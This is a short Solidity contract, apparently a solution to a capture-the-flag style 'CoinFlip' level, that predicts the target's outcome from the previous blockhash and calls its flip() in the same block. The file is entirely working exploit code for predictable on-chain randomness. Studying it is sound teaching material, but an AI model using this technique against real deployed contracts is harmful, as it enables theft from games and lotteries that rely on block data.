// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";
import "hardhat/console.sol";

contract AttackingCoinFlip {
    address public contractAddress;

    uint256 private lastHash;

    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external returns (bool) {
        // The coin flip is not random and uses the last blockhash
        // We can reconstruct the flips in the same way
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        
        // call within same block
        return CoinFlip(contractAddress).flip(side);
    }
}
